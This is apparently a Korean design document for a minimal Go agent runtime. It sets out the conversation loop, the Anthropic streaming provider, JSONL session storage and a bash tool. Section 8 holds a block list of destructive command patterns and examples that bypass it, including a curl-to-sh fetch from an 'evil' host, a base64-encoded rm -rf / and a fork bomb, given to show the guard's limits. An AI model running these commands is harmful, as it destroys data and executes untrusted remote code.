# Haemil Skeleton — Phase 2 코어 엔진 설계

> 작성일: 2026-04-11
> 상태: Phase 2 스텁 완료, 본문 구현 대기
> 대상 독자: 다음 세션에서 이 파일만 보고 본문을 채울 에이전트/개발자

---

## 0. 다른 설계서와의 관계

이 프로젝트에는 `analysis/integration/` 아래 두 개의 설계 문서가 있다. 역할이 다르다.

| 문서 | 범위 | 언제 본다 |
|------|------|-----------|
| `skeleton.md` (이 문서) | **단일 에이전트 1개가 돌아가는 코어 런타임** — 대화 루프, provider, tool, 세션 | Phase 2 (지금) |
| `multi-agent-communication.md` | **여러 에이전트 사이의 통신** — 태스크/이벤트/Advisor 3계층, SLA, Outbox | Phase 3 |

**skeleton.md 는 multi-agent-communication.md 의 Layer 0 (코어 런타임) 을 정의한다.** Layer 1~3 (태스크, 이벤트, Advisor) 은 Phase 3 에서 GoClaw + Paperclip 컴포넌트를 추출해 이 뼈대 위에 얹는다. 이번 세션은 **Layer 0 만** 다룬다.

---

## 1. 목적과 비스코프

### 이 뼈대가 답해야 하는 질문

> "`go run ./cmd/haemil` 했을 때 Claude 가 `ls` 치면 결과 보여주나?"

이 한 문장이 Phase 2 의 완성 기준이다. 풍부한 기능이 아니라 **end-to-end 1턴이 살아있는 상태** 가 목표다.

### 스코프

- ✅ provider 1 개 (Anthropic, `claude-sonnet-4-6`)
- ✅ tool 1 개 (bash, 최소 가드만)
- ✅ 세션 저장 (JSONL append-only)
- ✅ 대화 루프 (tool_use → tool_result 라운드 처리, max_iterations 종료)
- ✅ REPL 스텁 (Phase 2a 는 "skeleton ready" 출력까지, 실제 입력 루프는 Phase 2b)

### 비스코프 (Phase 3+ 로 연기)

- ❌ 멀티 프로바이더 (OpenAI, 로컬 oMLX)
- ❌ 멀티 에이전트 통신 (태스크/이벤트/Advisor 3계층)
- ❌ 권한 모드 (ReadOnly/Write/Full) — GoClaw 5계층 보안은 Phase 3
- ❌ 메모리 / 학습 루프 (Hermes 패턴은 Phase 3)
- ❌ MCP 클라이언트 (Goose 패턴은 Phase 3)
- ❌ HTTP 서버 / PostgreSQL / 멀티테넌트
- ❌ 웹 UI / Tauri / React Native

---

## 2. 패키지 레이아웃 + 임포트 그래프

```
haemil/
├── cmd/haemil/main.go              # CLI 엔트리
├── internal/
│   ├── runtime/
│   │   ├── message.go              # 도메인 타입 + Provider/Tool 인터페이스
│   │   ├── session.go              # JSONL 세션 저장
│   │   ├── conversation.go         # Runtime, Options, TurnSummary, RunTurn
│   │   ├── message_test.go
│   │   └── conversation_test.go
│   ├── provider/
│   │   ├── provider.go             # New 팩토리 + RedactAPIKey
│   │   ├── anthropic.go            # Anthropic 클라이언트 + sseScanner
│   │   └── provider_test.go
│   ├── tools/
│   │   ├── tool.go                 # Default() 레지스트리
│   │   ├── bash.go                 # BashTool + BLOCKED_PATTERNS
│   │   └── bash_test.go
│   └── cli/repl.go                 # Run(ctx, cfg) — 조립 + 입력 루프
├── go.mod                          # module github.com/ShinKwangsub/haemil, go 1.23
└── go.sum                          # (현재는 의존성 0개라 파일 없음)
```

### 임포트 그래프 (사이클 없음 보장)

```
main  →  cli
cli   →  runtime, provider, tools
provider  →  runtime           # runtime.Provider 구현
tools     →  runtime           # runtime.Tool 구현
runtime   →  (표준 라이브러리만)
```

**핵심 원칙**: `internal/runtime` 이 도메인 타입 **과** 두 인터페이스 (`Provider`, `Tool`) 를 모두 소유한다. "consumer 가 인터페이스를 정의한다" 는 Go 관용. `provider` 와 `tools` 는 둘 다 `runtime` 을 임포트하지만 **서로는 절대 모른다**. `cli` 만 셋 다를 임포트한다.

이 규칙을 깨려는 충동이 들면 인터페이스 설계가 잘못된 것이다.

---

## 3. 스텁 정책

"**조립** 코드는 진짜로 동작하고, **작업** 메서드만 `panic("TODO: ...")`"

### 조립 코드 (진짜 동작, panic 금지)

| 함수 | 파일 | 역할 |
|------|------|------|
| `provider.New(name, apiKey, model)` | provider.go | 팩토리 — name 분기 |
| `provider.RedactAPIKey(key)` | provider.go | 로그 안전 키 포맷 |
| `(*anthropicProvider).Name()` | anthropic.go | `return "anthropic"` |
| `runtime.NewSession(dir)` | session.go | MkdirAll + OpenFile + 구조체 할당 |
| `runtime.OpenSession(dir, id)` | session.go | 파일 재오픈 (replay 는 Phase 2b) |
| `(*Session).Close()` | session.go | `f.Close()` |
| `(*Session).ID()`, `.Path()` | session.go | 게터 |
| `runtime.New(p, tools, sess, opts)` | conversation.go | 필드 할당 + tool name 맵 |
| `(*Runtime).Provider/Tools/Session()` | conversation.go | 게터 |
| `tools.Default()` | tool.go | `return []Tool{NewBash()}` |
| `tools.NewBash()` | bash.go | `ToolSpec` 리터럴 채운 구조체 리턴 |
| `(*BashTool).Spec()` | bash.go | 캐시된 Spec 리턴 |
| `cli.Run(ctx, cfg)` | repl.go | 위 모든 것 조립 + "skeleton ready" 출력 |
| `main` | main.go | flag 파싱 + 시그널 + `cli.Run` |

### 작업 메서드 (panic TODO)

| 함수 | 파일 | 왜 스텁인가 |
|------|------|-------------|
| `(*anthropicProvider).Chat(ctx, req)` | anthropic.go | HTTP POST + SSE 스트리밍 — Phase 2b |
| `(*sseScanner).Next()` | anthropic.go | SSE 프레임 파싱 — Phase 2b |
| `(*BashTool).Execute(ctx, input)` | bash.go | `exec.CommandContext` + BLOCKED_PATTERNS 체크 — Phase 2b |
| `(*Session).AppendUser(msg)` | session.go | JSONL 직렬화 + write + fsync — Phase 2b |
| `(*Session).AppendAssistant(msg)` | session.go | 위와 동일 — Phase 2b |
| `(*Session).Messages()` | session.go | replay 결과 리턴 — Phase 2b |
| `(*Runtime).RunTurn(ctx, userInput)` | conversation.go | 턴 루프 전체 — Phase 2b (마지막) |

### 왜 이 구분이 중요한가

`cli.Run` 은 조립만 한다. 위 테이블의 **조립 코드만** 호출한다. 따라서 `go run ./cmd/haemil` 은 "skeleton ready" 메시지까지 **panic 0 번으로** 도달해야 한다. 이게 깨지면 조립 코드 어딘가가 의도와 달리 작업 메서드를 호출하는 것 = 뼈대 버그. 회귀 방지의 핵심 포인트다.

---

## 4. 타입 카탈로그

### `runtime.Role`

```go
type Role string
const (
    RoleUser      Role = "user"
    RoleAssistant Role = "assistant"
    RoleSystem    Role = "system"
)
```

**주의 (Anthropic 함정 #1)**: `RoleSystem` 은 정의는 해두지만 **메시지에 쓰지 않는다**. Anthropic 은 system 프롬프트를 `ChatRequest.System` (top-level) 으로 받는다. message role 에 system 넣으면 400 에러.

### `runtime.BlockType` + `ContentBlock`

```go
type BlockType string
const (
    BlockTypeText       BlockType = "text"
    BlockTypeToolUse    BlockType = "tool_use"
    BlockTypeToolResult BlockType = "tool_result"
)

type ContentBlock struct {
    Type BlockType `json:"type"`
    // text
    Text string `json:"text,omitempty"`
    // tool_use
    ID    string          `json:"id,omitempty"`
    Name  string          `json:"name,omitempty"`
    Input json.RawMessage `json:"input,omitempty"`
    // tool_result
    ToolUseID string `json:"tool_use_id,omitempty"`
    Content   string `json:"content,omitempty"`
    IsError   bool   `json:"is_error,omitempty"`
}
```

Flat struct + `omitempty` 조합이라 `json.Marshal` 하면 활성 블록 타입에 해당하는 필드만 나온다. `TestMessageJSONRoundtrip` 이 이걸 pinning.

### Anthropic 와이어 포맷 매핑

| `runtime.ContentBlock` | Anthropic JSON |
|------------------------|----------------|
| `{Type: "text", Text: "hi"}` | `{"type":"text","text":"hi"}` |
| `{Type: "tool_use", ID: "toolu_01", Name: "bash", Input: {"command":"ls"}}` | `{"type":"tool_use","id":"toolu_01","name":"bash","input":{"command":"ls"}}` |
| `{Type: "tool_result", ToolUseID: "toolu_01", Content: "out", IsError: false}` | `{"type":"tool_result","tool_use_id":"toolu_01","content":"out","is_error":false}` |

### `Message`

```go
type Message struct {
    Role    Role           `json:"role"`
    Content []ContentBlock `json:"content"`
}
```

**주의 (Anthropic 함정 #2)**: `tool_result` 블록은 반드시 `role: "user"` 메시지 안에 넣는다. 별도 "tool" role 이 없다.

### `ToolSpec`

```go
type ToolSpec struct {
    Name        string          `json:"name"`
    Description string          `json:"description"`
    InputSchema json.RawMessage `json:"input_schema"`
}
```

`InputSchema` 를 `json.RawMessage` 로 둔 이유: JSON Schema 는 자유 형식이라 Go 구조체로 고정하면 표현이 제한된다. 스텁 단계에서는 `bash.go` 에 리터럴 문자열로 박혀있다.

### `ChatRequest`

```go
type ChatRequest struct {
    Model       string     `json:"model"`
    System      string     `json:"system,omitempty"`
    Messages    []Message  `json:"messages"`
    Tools       []ToolSpec `json:"tools,omitempty"`
    MaxTokens   int        `json:"max_tokens"`    // Anthropic REQUIRED
    Temperature float64    `json:"temperature,omitempty"`
}
```

**주의 (Anthropic 함정 #3)**: `max_tokens` 는 Anthropic 에서 **필수**. 0 이면 400. `runtime.Options.MaxTokens` 기본값 4096.

### `ChatResponse` + `Usage`

```go
type Usage struct {
    InputTokens  int `json:"input_tokens"`
    OutputTokens int `json:"output_tokens"`
}

type ChatResponse struct {
    ID         string         `json:"id"`
    Model      string         `json:"model"`
    Content    []ContentBlock `json:"content"`
    StopReason string         `json:"stop_reason,omitempty"`
    Usage      Usage          `json:"usage"`
}
```

### `Provider` 인터페이스

```go
type Provider interface {
    Name() string
    Chat(ctx context.Context, req ChatRequest) (*ChatResponse, error)
}
```

**모든 작업 메서드의 첫 인자는 `ctx context.Context`**. main.go 가 `signal.NotifyContext` 로 SIGINT/SIGTERM 을 잡아 트리를 따라 전파한다. Chat 은 ctx 취소 시 in-flight HTTP 요청을 취소하고 `ctx.Err()` 를 리턴한다.

### `Tool` 인터페이스

```go
type Tool interface {
    Spec() ToolSpec
    Execute(ctx context.Context, input json.RawMessage) (string, error)
}
```

Execute 도 ctx 취소 지원 — 서브프로세스 실행 중 Ctrl+C 누르면 **프로세스 그룹** 까지 kill 해야 한다 (bash 가 fork 한 자식까지).

---

## 5. 턴 루프 알고리즘 (Runtime.RunTurn)

Phase 2b 에서 채울 본문의 의사코드. 이 순서로 구현한다.

```go
func (r *Runtime) RunTurn(ctx context.Context, userInput string) (*TurnSummary, error) {
    summary := &TurnSummary{}

    // 1. 사용자 메시지 생성 + 세션 기록
    userMsg := Message{
        Role:    RoleUser,
        Content: []ContentBlock{{Type: BlockTypeText, Text: userInput}},
    }
    if err := r.session.AppendUser(userMsg); err != nil {
        return nil, fmt.Errorf("append user: %w", err)
    }

    history := []Message{userMsg}

    // 2. 도구 스펙 advertise
    toolSpecs := make([]ToolSpec, 0, len(r.tools))
    for _, t := range r.tools {
        toolSpecs = append(toolSpecs, t.Spec())
    }

    // 3. Provider ↔ Tool 라운드 루프
    for i := 0; i < r.opts.MaxIterations; i++ {
        summary.Iterations++

        // ctx 취소 체크
        if err := ctx.Err(); err != nil {
            return summary, err  // 부분 결과 + 취소 에러
        }

        // 3a. provider.Chat 호출
        req := ChatRequest{
            Model:     r.opts.Model,
            System:    r.opts.SystemPrompt,
            Messages:  history,
            Tools:     toolSpecs,
            MaxTokens: r.opts.MaxTokens,
        }
        resp, err := r.provider.Chat(ctx, req)
        if err != nil {
            return summary, fmt.Errorf("provider.Chat (iter %d): %w", i, err)
        }
        summary.Usage.InputTokens += resp.Usage.InputTokens
        summary.Usage.OutputTokens += resp.Usage.OutputTokens
        summary.StopReason = resp.StopReason

        // 3b. assistant 메시지 세션 기록
        assistantMsg := Message{Role: RoleAssistant, Content: resp.Content}
        if err := r.session.AppendAssistant(assistantMsg); err != nil {
            return summary, fmt.Errorf("append assistant: %w", err)
        }
        history = append(history, assistantMsg)
        summary.AssistantMessages = append(summary.AssistantMessages, assistantMsg)

        // 3c. tool_use 블록 수집
        var toolUses []ContentBlock
        for _, block := range resp.Content {
            if block.Type == BlockTypeToolUse {
                toolUses = append(toolUses, block)
            }
        }
        if len(toolUses) == 0 {
            // 도구 호출 없음 → 정상 종료
            break
        }

        // 3d. 각 도구 실행 → tool_result 블록 생성
        resultBlocks := make([]ContentBlock, 0, len(toolUses))
        for _, use := range toolUses {
            tool, ok := r.toolByName[use.Name]
            if !ok {
                resultBlocks = append(resultBlocks, ContentBlock{
                    Type:      BlockTypeToolResult,
                    ToolUseID: use.ID,
                    Content:   "unknown tool: " + use.Name,
                    IsError:   true,
                })
                continue
            }
            output, execErr := tool.Execute(ctx, use.Input)
            isErr := execErr != nil
            content := output
            if isErr {
                content = execErr.Error()
            }
            resultBlocks = append(resultBlocks, ContentBlock{
                Type:      BlockTypeToolResult,
                ToolUseID: use.ID,
                Content:   content,
                IsError:   isErr,
            })
            summary.ToolCalls = append(summary.ToolCalls, ToolCallRecord{
                ToolName: use.Name,
                Input:    string(use.Input),
                Output:   content,
                IsError:  isErr,
            })
        }

        // 3e. tool_result 블록을 묶은 user 메시지 생성 + 세션 기록
        toolResultMsg := Message{Role: RoleUser, Content: resultBlocks}
        if err := r.session.AppendUser(toolResultMsg); err != nil {
            return summary, fmt.Errorf("append tool_result: %w", err)
        }
        history = append(history, toolResultMsg)
    }

    return summary, nil
}
```

### 주요 포인트

- **max_iterations 는 hard cap**. 도달 시 루프 탈출하고 그때까지의 `TurnSummary` 리턴.
- **ctx 취소 시 부분 결과 리턴**. nil 리턴하면 지금까지의 세션 기록이 UI 에서 사라져 보임.
- **unknown tool 처리**: 에러 블록으로 돌려보내면 provider 가 다시 판단하게 할 수 있다 (다음 라운드에서 텍스트로 복구 시도).
- **tool_result 도 user role**: 함정 #2 재확인.

---

## 6. SSE 이벤트 처리표 (anthropicProvider.Chat)

Anthropic 의 `/v1/messages` 스트리밍 응답은 이 이벤트들을 순서대로 보낸다. `sseScanner.Next()` 가 각 프레임을 돌려주고, `Chat` 이 accumulator 패턴으로 `ChatResponse` 를 채운다.

| SSE 이벤트 | `ChatResponse` 에 누적되는 것 | 처리 방식 |
|-----------|------------------------------|-----------|
| `message_start` | `ID`, `Model`, 빈 `Content`, `Usage.InputTokens` | 초기 상태 세팅 |
| `content_block_start` | 새 빈 `ContentBlock` 을 `Content` 에 추가 | `index` 필드로 위치 판정, type 따라 빈 블록 생성 |
| `content_block_delta` (type=`text_delta`) | 마지막 블록의 `Text` 에 append | `delta.text` 를 그냥 concat |
| `content_block_delta` (type=`input_json_delta`) | tool_use 블록의 `Input` 에 부분 JSON 조각 누적 | 버퍼에 바이트 append, 블록 stop 에서 파싱 |
| `content_block_stop` | 현재 블록 마무리 | tool_use 면 누적된 input 버퍼를 `json.RawMessage` 로 확정 |
| `message_delta` | `StopReason`, `Usage.OutputTokens` 업데이트 | `delta.stop_reason`, `usage.output_tokens` |
| `message_stop` | 스트림 종료 — 최종 `ChatResponse` 리턴 | 루프 탈출 |
| `ping` | 무시 | keepalive |
| `error` | 에러 리턴 | `{"type":"error","error":{"type":"...","message":"..."}}` 파싱 |

### 함정 #4: `input_json_delta` 누적

`tool_use` 블록의 `input` 은 한 번에 오지 않는다. `input_json_delta` 로 `partial_json` 문자열이 여러 번 나눠 온다. **전부 concat 한 뒤** `content_block_stop` 시점에 **한 번만** 파싱해야 한다. 중간에 파싱 시도하면 "unexpected end of JSON input" 뜬다.

```go
// content_block_delta (input_json_delta)
buf.WriteString(event.delta.partial_json)

// content_block_stop
if currentBlock.Type == BlockTypeToolUse {
    currentBlock.Input = json.RawMessage(buf.Bytes())
    buf.Reset()
}
```

---

## 7. 세션 JSONL 포맷

### 한 줄 레이아웃

```json
{"ts":"2026-04-11T12:34:56.789Z","message":{"role":"user","content":[{"type":"text","text":"hi"}]}}
```

- `ts`: RFC3339Nano (`time.RFC3339Nano`). 나노초까지 포함.
- `message`: `runtime.Message` 의 JSON 직렬화 결과 그대로.
- 줄 끝: `\n` (유닉스 라인 피드)

### 예시 3 줄

```jsonl
{"ts":"2026-04-11T12:34:56.100Z","message":{"role":"user","content":[{"type":"text","text":"ls analysis/platforms/"}]}}
{"ts":"2026-04-11T12:34:57.890Z","message":{"role":"assistant","content":[{"type":"text","text":"Sure, I'll list that directory."},{"type":"tool_use","id":"toolu_01ABC","name":"bash","input":{"command":"ls analysis/platforms/"}}]}}
{"ts":"2026-04-11T12:34:58.200Z","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"toolu_01ABC","content":"autoagent.md\nclaw-code.md\ngoclaw.md\ngoose.md\nhermes.md\nopenclaw.md\npaperclip.md\n","is_error":false}]}}
```

### fsync 정책

**매 `Append*` 호출마다 `f.Sync()`**. Phase 2 는 안전성 우선 — 성능 최적화는 Phase 3 (세션 압축 + 배치 fsync) 에서 한다.

```go
func (s *Session) AppendUser(msg Message) error {
    line := struct {
        TS      string  `json:"ts"`
        Message Message `json:"message"`
    }{
        TS:      time.Now().UTC().Format(time.RFC3339Nano),
        Message: msg,
    }
    buf, err := json.Marshal(line)
    if err != nil {
        return fmt.Errorf("marshal: %w", err)
    }
    buf = append(buf, '\n')
    if _, err := s.file.Write(buf); err != nil {
        return fmt.Errorf("write: %w", err)
    }
    if err := s.file.Sync(); err != nil {
        return fmt.Errorf("fsync: %w", err)
    }
    s.msgs = append(s.msgs, msg)
    return nil
}
```

### 파일/디렉토리 권한

- 디렉토리: `0700` (`os.MkdirAll` 시점)
- 파일: `0600` (`os.OpenFile` 시점, `O_APPEND|O_CREATE|O_WRONLY`)

사용자 홈 아래 `~/.haemil/sessions/<id>.jsonl` 은 다른 유저가 읽으면 안 된다.

### replay 시 손상 줄 처리

`OpenSession` 이 파일을 여는 시점부터 한 줄씩 `json.Unmarshal` 한다. **파싱 실패 = 경고 로그 + 해당 줄 스킵 + 계속 진행**. 한 줄이 깨졌다고 전체 replay 를 죽이지 않는다.

```go
scanner := bufio.NewScanner(s.file)
for scanner.Scan() {
    var line struct {
        TS      string  `json:"ts"`
        Message Message `json:"message"`
    }
    if err := json.Unmarshal(scanner.Bytes(), &line); err != nil {
        fmt.Fprintf(os.Stderr, "session: skipping corrupt line in %s: %v\n", s.path, err)
        continue
    }
    s.msgs = append(s.msgs, line.Message)
}
```

---

## 8. bash 가드 정책 (`BLOCKED_PATTERNS`)

**이건 보안 경계가 아니다.** 우회는 trivial 하다 (`sudo`, base64, `curl | sh` 등). 목적은 단 하나: 뼈대 스모크 테스트 중 실수로 머신을 날리지 않는 것.

### 차단 패턴 (bash.go 에 선언됨)

```go
var BLOCKED_PATTERNS = []*regexp.Regexp{
    regexp.MustCompile(`\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r|-r\s+-f|-f\s+-r)\s+/`),
    regexp.MustCompile(`\bmkfs\.[a-zA-Z0-9]+\b`),
    regexp.MustCompile(`\bdd\s+.*\bof=/dev/(sd[a-z]|nvme|hd[a-z]|disk)`),
    regexp.MustCompile(`:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:`),
    regexp.MustCompile(`>\s*/dev/(sd[a-z]|nvme|hd[a-z]|disk)`),
}
```

### 차단되는 예시

- `rm -rf /`
- `rm -rf /home/user`
- `rm -fr /`
- `mkfs.ext4 /dev/sda1`
- `dd if=/dev/zero of=/dev/sda`
- `:(){ :|:& };:`
- `echo foo > /dev/sda`

### **차단되지 않는** 예시 (의도적으로 통과)

- `sudo rm -rf /` — sudo 래핑은 검사 안 함
- `curl https://evil.example.com/payload | sh` — 파이프 우회
- `base64 -d <<< "cm0gLXJmIC8K" | sh` — 인코딩 우회
- `rm -rf ~` — home 삭제는 `/` 와 경로 다름
- `rm oldfile.txt` — 단일 파일 삭제는 허용

### Phase 3 에서 교체될 자리

이 섹션 전체는 Phase 3 에서 **GoClaw 의 5계층 보안 아키텍처** (`analysis/platforms/goclaw.md` §2.4) 로 교체된다. `BLOCKED_PATTERNS` 는 그때 제거되고 `CommandIntent` 분류 + `PermissionMode` 게이트 + sandbox 격리가 들어온다.

---

## 9. 알아둘 함정 13 개 (Anthropic API 미스매치)

실제 API 를 호출하기 시작하면 반드시 마주치는 것들. 미리 적어두지 않으면 각자 한 번씩 당한다.

1. **`system` 은 top-level** — `messages` 배열 안에 `{"role":"system","content":"..."}` 넣으면 400. `ChatRequest.System` 으로 보낸다.
2. **`tool_result` 는 user role** — `{"role":"tool","content":[...]}` 는 없다. `{"role":"user","content":[{"type":"tool_result", ...}]}` 형태.
3. **`max_tokens` 필수** — 0 이면 400. 기본값 4096 을 `runtime.Options.MaxTokens` 에 둠.
4. **`anthropic-version` 헤더 필수** — `2023-06-01` 을 매 요청 세팅. 없으면 400.
5. **`x-api-key` (NOT `Authorization: Bearer`)** — OpenAI 관습과 다르다. 첫 구현 시 거의 반드시 틀린다.
6. **`input_json_delta` 누적** — tool_use 의 input JSON 은 조각으로 스트리밍된다. concat 한 뒤 `content_block_stop` 에서 한 번만 파싱.
7. **SSE `data:` 프리픽스** — `data: {...}` 형태. 콜론 뒤 공백 1 개. `data:[DONE]` 은 OpenAI 형식이고 Anthropic 은 `message_stop` 이벤트로 끝.
8. **빈 text 블록 금지** — assistant 메시지 보낼 때 `{"type":"text","text":""}` 같은 빈 블록 넣으면 400. tool_use 만 있는 메시지는 text 블록 자체를 생략.
9. **tool_use 의 `input` 은 JSON object** — string 으로 보내면 400. `json.RawMessage` 로 파싱 가능한 object 여야 함.
10. **`stop_reason` 값들** — `end_turn`, `max_tokens`, `tool_use`, `stop_sequence`. `tool_use` 는 conversation loop 내부에서 처리되어 사용자에게 올라가선 안 되고, 나머지가 실제 종료 사유.
11. **429 / 529 재시도** — rate limit 은 429, overloaded 는 529. 두 경우 모두 exponential backoff 가 맞다. GoClaw 패턴 참고.
12. **Streaming 요청 시 `stream: true`** — body 안에 넣어야 한다. `Accept: text/event-stream` 만으론 안 됨. 둘 다 있어야 확실.
13. **에러 바디 형태** — `{"type":"error","error":{"type":"invalid_request_error","message":"..."}}`. top-level `type: "error"` 체크하는 게 정답.

---

## 10. 다음 세션 (Phase 2b) 본문 구현 순서

파일 순서가 곧 의존 순서다. 앞에 게 돌아야 뒤에 게 테스트 가능.

1. **`runtime/session.go`** — `AppendUser` / `AppendAssistant` / `Messages` / `OpenSession` replay
   - 테스트: 간단한 temp dir 에 append 후 replay 해서 일치 확인
   - fsync 정책 검증 (파일 크기 변화 확인)
2. **`provider/anthropic.go`** — `Chat` + `sseScanner.Next` + SSE 이벤트 처리
   - 테스트: fake HTTP server (httptest) 로 event stream 흉내 → 파싱 결과 검증
   - 함정 #1~#13 각각에 대한 회귀 테스트 추가
3. **`tools/bash.go`** — `Execute` + BLOCKED_PATTERNS 체크 + 프로세스 그룹 kill
   - 테스트: `echo hello` 실행, 타임아웃 동작, ctx 취소 시 프로세스 kill
4. **`runtime/conversation.go`** — `RunTurn` 턴 루프
   - 테스트: fake Provider + fake Tool 로 1-round (텍스트만), 2-round (tool_use → tool_result), max_iterations hit, ctx 취소
   - `TestRunTurnSkeleton` 의 Skip 제거
5. **`cli/repl.go`** — 실제 REPL 입력 루프 (bufio.Scanner 또는 `readline` 라이브러리)
   - 스모크 테스트: 파이프로 입력 넣어서 출력 확인 + exit 코드

### 완성 기준 (Phase 2b)

```bash
export ANTHROPIC_API_KEY=sk-ant-...
./haemil <<EOF
ls analysis/platforms/
이 디렉토리에 몇 개 파일 있어?
/exit
EOF
```

위 스크립트가:
1. bash 도구로 실제 `ls` 실행
2. Claude 가 파일 개수 세서 대답
3. 세션 JSONL 파일이 `~/.haemil/sessions/<id>.jsonl` 에 기록됨
4. 정상 종료

여기까지 가면 Phase 2 완료. Phase 3 로 진입.

---

## 부록 A: 합격선 (Phase 2a 스텁)

이 5 가지가 통과해야 Phase 2a 가 끝났다고 본다.

1. `go mod tidy` — 의존성 0 개 유지
2. `go build ./...` — 컴파일 통과
3. `go vet ./...` — vet 클린
4. `go test ./...` — 5 개 테스트, 1 Skip, 4 PASS, 0 fail
5. `go run ./cmd/haemil` — "haemil skeleton ready — REPL not yet implemented" 출력 후 exit 0

추가 수동 검증:
- `unset ANTHROPIC_API_KEY && go run ./cmd/haemil` → stderr 경고 + stdout 정상 메시지
- `ANTHROPIC_API_KEY=sk-ant-dummy123456789 go run ./cmd/haemil` → stderr 에 `sk-a...6789` (redact 된 형태) + 정상 메시지
- `~/.haemil/sessions/` 가 `drwx------` (0700), 내부 `.jsonl` 이 `-rw-------` (0600)

## 부록 B: macOS 에서 디렉토리 트리 보는 법

`tree` 는 기본 설치 안 돼 있다. 대안:

```bash
# 옵션 1: find
find . -type d -not -path '*/reference/*' -not -path '*/.git/*' | sort

# 옵션 2: brew
brew install tree
tree -L 3 -I 'reference|.git'
```
